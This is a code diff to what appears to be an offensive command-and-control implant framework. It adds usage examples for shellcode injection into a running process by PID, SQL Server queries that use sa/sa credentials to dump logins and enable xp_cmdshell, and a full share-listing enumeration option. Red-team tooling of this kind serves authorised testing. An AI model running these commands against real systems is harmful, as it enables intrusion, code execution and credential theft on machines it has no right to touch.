@@ -214,7 +214,9 @@ def do_inject_shellcode_kct(user, command, implant_id, command_prefix=""):
         
     Examples:
         inject-shellcode-kct [path-to-executable-to-start] [windows name]
+        inject-shellcode-kct [pid] [windows name]
         inject-shellcode-kct c:\\windows\\system32\\msinfo32.exe "System Information"
+        inject-shellcode-kct 38343 "System Information"
         inject-shellcode-kct c:\\windows\\notepad.exe Notepad
 
     """
@@ -792,10 +794,21 @@ def do_sqlquery(user, command, implant_id, command_prefix=""):
         sqlquery server=localhost username=sa password=sa
         sqlquery server=localhost port=5555 username=sa password=sa database=Master
         sqlquery server=localhost port=5555 username=sa password=sa catalogue=Master
+        sqlquery connectionstring="Server=127.0.0.1:1433;Database=MYDB;Initial Catalog=Master;Integrated Security=True;" query="SELECT suser_name();"
         sqlquery server=localhost port=5555 username=sa password=sa query="SELECT suser_name();"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT @@version;"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT suser_name();"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT user;"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT user_name();"
+        sqlquery server=localhost port=5555 username=sa password=sa query="EXEC sp_databases;"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT * from sysobjects where xtype='u';"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT name from DBNAME..sysobjects where xtype='u';"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT * FROM databaseName.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
+        sqlquery server=localhost port=5555 username=sa password=sa query="SELECT * FROM sys.sql_logins;"
         sqlquery server=localhost port=5555 username=sa password=sa query="EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 
     """
+    command = command.replace("sqlquery", "run-exe SQLQuery.Program SQLQuery")
     check_module_loaded("SQLQuery.exe", implant_id, user, load_module_command=command_prefix)
     new_task = NewTask(
         implant_id=implant_id,
@@ -3319,7 +3332,9 @@ def do_echo(user, command, implant_id, command_prefix=""):
 @command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
 def do_net_share_enum(user, command, implant_id, command_prefix=""):
     """
-    Enumerates shares on the target.
+    Enumerates shares on the target. The net-share-enum-full option tries to perform a directory listing on all shares except the following:
+
+    "SYSVOL", "ADMIN$", "NETLOGON", "IPC$", "PRINT$", "C$", "D$", "E$", "F$", "G$", "H$", "I$", "J$", "K$", "L$", "M$", "N$", "O$", "P$", "Q$", "R$", "S$", "T$", "U$", "V$", "W$", "X$", "Y$", "Z$"
 
     Uses netapi32.dll NetShareEnum.
 
@@ -3328,9 +3343,11 @@ def do_net_share_enum(user, command, implant_id, command_prefix=""):
 
     Arguments:
         net-share-enum <comma separated server list>
+        net-share-enum-full <comma separated server list>
 
     Examples:
         net-share-enum hostname1,hostname2
+        net-share-enum-full hostname1,hostname2
     """
     new_task = NewTask(
         implant_id=implant_id,
